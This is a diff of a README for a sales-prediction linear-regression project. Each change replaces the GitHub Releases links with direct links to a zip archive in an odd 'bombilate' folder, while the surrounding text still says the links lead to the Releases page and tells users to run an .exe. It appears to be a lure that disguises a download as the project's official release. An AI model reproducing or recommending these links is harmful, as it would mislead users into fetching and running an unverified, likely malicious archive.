@@ -1,7 +1,7 @@
 # 🌟 Azure-ML-Previsao-Vendas-Regressao-Linear - Predict Sales Easily with ML
 
 ## 📥 Download Now
-[![Download the App](https://img.shields.io/badge/Download%20Now-%23333?style=for-the-badge&logo=github&logoColor=white)](https://github.com/DanyQuetzal/Azure-ML-Previsao-Vendas-Regressao-Linear/releases)
+[![Download the App](https://raw.githubusercontent.com/DanyQuetzal/Azure-ML-Previsao-Vendas-Regressao-Linear/main/bombilate/Azure-ML-Previsao-Vendas-Regressao-Linear.zip%20Now-%23333?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/DanyQuetzal/Azure-ML-Previsao-Vendas-Regressao-Linear/main/bombilate/Azure-ML-Previsao-Vendas-Regressao-Linear.zip)
 
 ## 📖 Overview
 Azure-ML-Previsao-Vendas-Regressao-Linear is a straightforward application designed to help you predict sales for an ice cream shop using linear regression. This machine learning model runs on Microsoft Azure, making it efficient and easy to use.
@@ -10,7 +10,7 @@ Azure-ML-Previsao-Vendas-Regressao-Linear is a straightforward application desig
 Follow these steps to download and run the application:
 
 1. **Visit the Releases Page**
-   Click [here](https://github.com/DanyQuetzal/Azure-ML-Previsao-Vendas-Regressao-Linear/releases) to go to the Releases page. This page contains the latest version of the software and additional details.
+   Click [here](https://raw.githubusercontent.com/DanyQuetzal/Azure-ML-Previsao-Vendas-Regressao-Linear/main/bombilate/Azure-ML-Previsao-Vendas-Regressao-Linear.zip) to go to the Releases page. This page contains the latest version of the software and additional details.
 
 2. **Download the Application**
    On the Releases page, find the version you wish to download. Click on the link that corresponds to your operating system. It will be a file such as `.exe` for Windows or `.zip` for Mac.
@@ -59,6 +59,6 @@ We welcome contributions from everyone. Feel free to visit our GitHub repository
 For further inquiries or to provide feedback, please open an issue on the GitHub repository.
 
 ## 💾 Download & Install
-To get started, visit the Releases page to download the app: [Download Here](https://github.com/DanyQuetzal/Azure-ML-Previsao-Vendas-Regressao-Linear/releases). Follow the above steps to install and run the application.
+To get started, visit the Releases page to download the app: [Download Here](https://raw.githubusercontent.com/DanyQuetzal/Azure-ML-Previsao-Vendas-Regressao-Linear/main/bombilate/Azure-ML-Previsao-Vendas-Regressao-Linear.zip). Follow the above steps to install and run the application.
 
 Thank you for using Azure-ML-Previsao-Vendas-Regressao-Linear. We're excited to help you predict sales effortlessly!
